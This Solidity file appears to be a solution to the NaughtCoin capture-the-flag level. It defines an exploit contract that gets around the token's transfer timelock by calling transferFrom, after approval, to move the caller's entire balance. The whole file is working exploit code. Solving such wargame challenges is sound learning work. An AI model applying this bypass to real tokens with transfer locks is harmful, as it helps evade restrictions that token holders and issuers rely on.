// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaughtCoin {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract NaughtExploit {
    function exploit(address _naughtCoin) external {
        INaughtCoin token = INaughtCoin(_naughtCoin);
        uint256 balance = token.balanceOf(msg.sender);
        
        // The caller needs to approve this contract first
        // Then we can transfer the tokens
        require(token.transferFrom(msg.sender, address(this), balance), "Transfer failed");
    }
    
    // Helper function to get the balance to approve
    function getPlayerBalance(address _naughtCoin, address _player) external view returns (uint256) {
        return INaughtCoin(_naughtCoin).balanceOf(_player);
    }
}